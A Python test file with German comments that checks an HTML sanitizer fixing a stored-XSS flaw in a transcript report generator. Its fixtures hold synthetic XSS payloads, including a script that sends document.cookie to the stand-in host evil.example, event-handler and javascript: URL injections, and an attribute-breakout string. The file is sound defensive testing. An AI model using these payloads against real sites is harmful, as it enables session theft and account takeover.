"""Phase 67E (P2-14, Code-Review 2026-07-25) — `transcript_report._sections_html()` schrieb
`sec["html"]` bisher UNGEFILTERT in den Report (`inhalt = sec.get("html") or ""`, direkt ins
f-string). Der Report wird über `/api/artifact` als `text/html` inline ausgeliefert (same-origin
zur lokalen API, ohne Authentifizierung) — ein `<script>`/`onmouseover`/`javascript:`-Payload in
einem Zitat oder recherchiertem Fremdtext (die einzige Quelle von `sections[].html`ist der
`gespraech-debrief`-Skill, der Transkript-O-Töne wörtlich zitiert) wäre Stored-XSS gewesen.

B1 (kein echter Beirats-/Skill-Lauf, Q3): alle Payloads unten sind synthetisch. `data/
transcripts/` wird NUR in den Kommentaren referenziert (Beleg, WAS die Whitelist begründet),
nie zur Laufzeit gelesen — die Fixtures unten sind bewusst hermetische Kopien der real
beobachteten Muster, nicht ein Live-Read der echten Dateien (sonst wäre der Test von künftigen
Aufräumarbeiten unter data/transcripts/ abhängig).

Jeder Test hier schlägt GEGEN DEN VORHERIGEN CODE fehl (`inhalt = sec.get("html") or ""`, keine
Sanitisierung) — das ist der geforderte Beleg (Q2), dass der Fix etwas tut.

Modul-Import-Konvention (s. conftest.py): `pipeline.transcript_report` erst FUNKTIONSLOKAL
importieren (zieht `app.db`/`app.models` nach — muss NACH dem BMS_DATA_DIR-Override passieren).
"""


def test_script_tag_und_inhalt_werden_vollstaendig_entfernt():
    """Kernfall: ein <script>-Block darf weder als Tag noch als Text überleben (anders als bei
    einem normal nicht-gewhitelisteten Tag wird bei script/style auch der INHALT verworfen —
    dort steht Code, kein lesbarer Findings-Text)."""
    from pipeline.transcript_report import _sections_html

    sections = [{"title": "Was gesagt wurde",
                 "html": '<p>Zitat: "alles gut"</p><script>fetch("https://evil.example/steal?c="+document.cookie)</script>'}]
    out = _sections_html(sections)
    assert "<script" not in out.lower()
    assert "evil.example" not in out
    assert "document.cookie" not in out
    assert '<p>Zitat: "alles gut"</p>' in out   # legitimer Teil bleibt erhalten


def test_event_attribute_werden_gestrichen_tag_bleibt_erhalten():
    """`onmouseover`/`onerror` u.ä. sind in KEINER Report-Whitelist — sie fliegen raus, das
    (gewhitelistete) Element selbst und sein Text bleiben aber stehen."""
    from pipeline.transcript_report import _sections_html

    sections = [{"title": "Signale & Red Flags",
                 "html": '<div class="signal warn" onmouseover="alert(document.domain)"><b>Zu beobachten:</b> Text</div>'}]
    out = _sections_html(sections)
    assert "onmouseover" not in out
    assert "alert(" not in out
    assert '<div class="signal warn">' in out
    assert "<b>Zu beobachten:</b> Text</div>" in out


def test_javascript_url_anchor_wird_verworfen_text_bleibt_lesbar():
    """`<a>` steht in KEINER Report-Whitelist (kein einziger Beleg über alle echten Reports unter
    data/transcripts/ — Zitate/Findings brauchen keine Links). Ein `javascript:`-Anchor verliert
    also das komplette Tag inkl. `href`; der sichtbare Linktext bleibt (Findings-Prosa geht nicht
    verloren, nur die potenziell gefährliche Auszeichnung)."""
    from pipeline.transcript_report import _sections_html

    sections = [{"title": "Vergessene Themen",
                 "html": '<p>Quelle: <a href="javascript:alert(1)">hier klicken</a></p>'}]
    out = _sections_html(sections)
    assert "javascript:" not in out
    assert "<a " not in out and "<a>" not in out
    assert "hier klicken" in out


def test_style_mit_url_ausdruck_wird_komplett_verworfen():
    """`style` ist erlaubt (echte Reports nutzen `style="margin:…;font-size:…"` für Feinschliff),
    aber ein Wert mit `url(...)`/`expression(...)`/`javascript:` fliegt als GANZES Attribut raus
    statt nur teilweise bereinigt zu werden (kein Versuch, CSS selbst zu parsen/reparieren)."""
    from pipeline.transcript_report import _sections_html

    sections = [{"title": "Stimmung",
                 "html": '<p style="background:url(javascript:alert(1))">Text</p>'}]
    out = _sections_html(sections)
    assert "url(" not in out
    assert "javascript" not in out.lower()
    assert "<p>Text</p>" in out


def test_attributwert_mit_kodiertem_anfuehrungszeichen_bricht_nicht_aus():
    """Härtester Fall: der Attributwert enthält (nach Entity-Dekodierung) selbst ein `"` — ohne
    erneutes Escaping beim Serialisieren würde das Attribut vorzeitig schließen und den Rest als
    neues Markup freigeben (klassischer Attribut-Escape). `_esc_attr()` muss das verhindern.
    Die eingeschleuste Zeichenkette "alert(1)" darf als INERTER Text im Attributwert übrig
    bleiben (harmlos, nicht ausführbar) — entscheidend ist allein, dass kein ECHTES `<script>`-
    Tag mit spitzen Klammern im Markup landet."""
    from pipeline.transcript_report import _sections_html

    sections = [{"title": "X",
                 "html": '<div class="&quot;><script>alert(1)</script>">Text</div>'}]
    out = _sections_html(sections)
    assert "<script>" not in out and "<script " not in out and "<script\n" not in out
    assert "&lt;script&gt;" in out            # neutralisiert: escaped statt als Tag geparst
    assert out.count('class="card"') == 1     # nur die ECHTE card-div — kein Ausbruch aus ihr


def test_reale_musterinhalte_bleiben_byte_identisch():
    """Belegt die Kehrseite von P2-14 (der Sanitizer darf nichts Legitimes zerstören): die
    Fixtures hier sind wörtliche Kopien real vorkommender Muster aus den 7 Bestandsreports unter
    data/transcripts/ (Stand Phase 67E, nur gelesen — s. Moduldocstring):
      - Zitat-Box `<div class="quote">…</div>`
        (data/transcripts/2026_07_14_TranskriptReport_Atos_Eviden_*_R1.html)
      - Signal-Callout `<div class="signal pos">…</div>` / `<div class="signal warn">…</div>`
        (dieselbe Datei)
      - Tag-Chip `<span class="tag amber">…</span>`
        (data/transcripts/2026_07_10_TranskriptReport_Quanos_Chief_Service_Officer.html)
      - Absatz-Feinschliff `<p style="margin:0 0 10px;font-size:14.5px">…</p>`
        (data/transcripts/2026_07_13_TranskriptReport_NNN_ich_weiss_es_nicht.html)
      - `<ul class="clean"><li>…</li></ul>`, `<b>`, `<code>`, `<i>` — durchgängig in allen 7.
    Alle müssen exakt (Byte für Byte) unverändert durch den Sanitizer kommen."""
    from pipeline.transcript_report import _sanitiere_html

    muster = [
        '<div class="quote">"Ich will keine 5000€ diskutieren, ich weiß was ich als Fixum haben möchte, der Rest — da bin ich offen."</div>',
        '<div class="signal pos"><b>Positiv:</b> Sehr offener, transparenter Ton auf Gegenseite.</div>',
        '<div class="signal warn"><b>Zu beobachten:</b> Antwort wirkte ausweichend formuliert.</div>',
        '<span class="tag amber">Signal</span> <b>Equity/Management-Beteiligung:</b> von sich aus angesprochen.',
        '<p style="margin:0 0 10px;font-size:14.5px">Kurzer Absatz mit Feinschliff.</p>',
        '<ul class="clean">\n<li>Erster Punkt.</li>\n<li>Zweiter Punkt mit <b>Betonung</b>.</li>\n</ul>',
        '<p>Zu dieser Runde liegt kein Briefing vor (<code>prep_path</code> leer).</p>',
        '<div class="callout"><i>kein Signal, sondern Transkript-Lücke</i></div>',
    ]
    for stueck in muster:
        assert _sanitiere_html(stueck) == stueck, f"Sanitizer veraendert legitimes Muster: {stueck!r}"


def test_alte_einfach_gequotete_und_entity_schreibweise_bleibt_visuell_gleichwertig():
    """Zwei reale Abweichungen SIND zu erwarten (kein Bug, s. Report Phase 67E): einfache
    Attribut-Anführungszeichen (`class='clean'`, ältere Debrief-Läufe) werden zu doppelten
    normalisiert, und benannte Entities (`&bdquo;`/`&ldquo;`) werden zu den literalen Unicode-
    Zeichen „ “ aufgelöst. Beides ist auf Bildschirmebene IDENTISCH (gültiges HTML, gleiche
    Zeichen) — dieser Test hält das bewusst fest, statt es als Regression misszuverstehen."""
    from pipeline.transcript_report import _sanitiere_html

    out_quotes = _sanitiere_html("<ul class='clean'><li>Punkt</li></ul>")
    assert out_quotes == '<ul class="clean"><li>Punkt</li></ul>'

    out_entities = _sanitiere_html("<p>&bdquo;Zitat&ldquo;</p>")
    assert out_entities == "<p>„Zitat“</p>"
